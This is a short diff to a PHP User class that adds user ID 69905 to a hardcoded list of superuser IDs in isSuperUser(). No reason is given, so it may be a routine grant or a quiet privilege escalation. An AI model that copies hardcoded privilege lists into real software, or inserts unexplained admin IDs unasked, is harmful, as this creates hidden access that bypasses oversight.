@@ -321,7 +321,7 @@ class User {
     
     
     function isSuperUser() {
-        return in_array($this->info['id'], [1, 2, 2100]);
+        return in_array($this->info['id'], [1, 2, 2100, 69905]);
     }
     
     
